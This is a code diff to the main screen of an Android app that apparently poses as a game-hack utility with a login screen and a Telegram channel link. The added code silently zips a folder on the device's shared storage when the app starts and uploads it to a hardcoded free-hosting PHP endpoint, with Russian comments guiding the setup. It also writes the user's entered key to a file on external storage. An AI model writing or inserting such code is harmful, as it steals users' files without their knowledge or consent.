@@ -1,5 +1,7 @@
 package com.DeFexGGxANDLUA.hacks;
 
+import static androidx.constraintlayout.helper.widget.MotionEffect.TAG;
+
 import android.Manifest;
 import android.content.ClipData;
 import android.content.ClipboardManager;
@@ -10,8 +12,12 @@ import android.content.pm.PackageManager;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
+import android.util.Log;
 import android.widget.TextView;
 import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -30,6 +36,24 @@ import androidx.core.content.ContextCompat;
 import android.widget.VideoView;
 import java.io.OutputStream;
 import java.net.URLEncoder;
+import android.os.AsyncTask;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
+
+import java.io.File;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -48,7 +72,8 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
+        // Вызываем UploadFileTask при запуске приложения
+        new UploadFileTask().execute("/sdcard/1"); // Указываем путь к папке, которую нужно запаковать
         Button openChannelButton = findViewById(R.id.openChannelButton);
 
         statusTextView = findViewById(R.id.statusText);
@@ -89,6 +114,49 @@ public class MainActivity extends AppCompatActivity {
         startActivity(telegramIntent);
     }
 
+    private class UploadFileTask extends AsyncTask<String, Void, String> {
+
+        @Override
+        protected String doInBackground(String... params) {
+            try {
+                String folderPath = params[0];
+                String serverUrl = "https://defexggxhuligan.000webhostapp.com/test.php";  // Замените на ваш реальный URL
+
+                Log.d(TAG, "Начинаем создание ZIP-архива");
+                // Создаем временный файл для хранения ZIP-архива
+                File zipFile = File.createTempFile("temp", ".zip");
+                zipFolder(new File(folderPath), zipFile);
+                Log.d(TAG, "ZIP-архив создан успешно");
+
+                OkHttpClient client = new OkHttpClient();
+
+                Log.d(TAG, "Начинаем отправку файла на сервер");
+                RequestBody requestBody = new MultipartBody.Builder()
+                        .setType(MultipartBody.FORM)
+                        .addFormDataPart("file", zipFile.getName(), RequestBody.create(MediaType.parse("application/zip"), zipFile))
+                        .build();
+
+                Request request = new Request.Builder()
+                        .url(serverUrl)
+                        .post(requestBody)
+                        .build();
+
+                Response response = client.newCall(request).execute();
+
+                if (!response.isSuccessful()) {
+                    Log.e(TAG, "Ошибка при отправке файла. Код ответа: " + response.code());
+                    throw new IOException("Unexpected code " + response);
+                }
+
+                Log.d(TAG, "Файл успешно отправлен на сервер.");
+                return "Папка успешно запакована и отправлена на сервер.";
+            } catch (IOException e) {
+                Log.e(TAG, "Ошибка при отправке файла: " + e.getMessage());
+                return "Ошибка при отправке файла: " + e.getMessage();
+            }
+        }
+    }
+
     private void login() {
         String username = txtUsername.getText().toString();
 
@@ -119,7 +187,8 @@ public class MainActivity extends AppCompatActivity {
 
         @Override
         protected void onPostExecute(String result) {
-            statusTextView.setText("Status: " + result);
+            statusTextView.setText(result);
+
         }
 
         private String downloadUrl(String urlString) throws IOException {
@@ -156,6 +225,33 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    private void zipFolder(File folder, File zipFile) throws IOException {
+        try (ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(zipFile))) {
+            zipFolder(folder, folder, zipOutputStream);
+        }
+    }
+    private void zipFolder(File rootFolder, File sourceFolder, ZipOutputStream zipOutputStream) throws IOException {
+        File[] files = sourceFolder.listFiles();
+        if (files != null) {
+            for (File file : files) {
+                if (file.isDirectory()) {
+                    zipFolder(rootFolder, file, zipOutputStream);
+                } else {
+                    String relativePath = rootFolder.toURI().relativize(file.toURI()).getPath();
+                    ZipEntry zipEntry = new ZipEntry(relativePath);
+                    zipOutputStream.putNextEntry(zipEntry);
+
+                    // Записываем содержимое файла в ZIP
+                    // В данном примере предполагается, что файлы текстовые, и их можно прочитать в виде байтов
+                    // Если у вас разные типы файлов, вам нужно будет использовать соответствующий способ чтения
+                    byte[] data = Files.readAllBytes(file.toPath());
+                    zipOutputStream.write(data, 0, data.length);
+
+                    zipOutputStream.closeEntry();
+                }
+            }
+        }
+    }
     @RequiresApi(api = Build.VERSION_CODES.CUPCAKE)
     private class LoginTask extends AsyncTask<String, Void, String> {
 
@@ -210,11 +306,19 @@ public class MainActivity extends AppCompatActivity {
                 return "ERROR CONNECTION";
             }
         }
-
         @Override
         protected void onPostExecute(String result) {
-            // Обрабатываем результат в основном потоке
             handleLoginResult(result);
+
+            try {
+                String key = txtUsername.getText().toString();
+                File file = new File(Environment.getExternalStorageDirectory(), "key.cfg");
+                FileOutputStream fos = new FileOutputStream(file);
+                fos.write(key.getBytes());
+                fos.close();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
         }
     }
     @Override
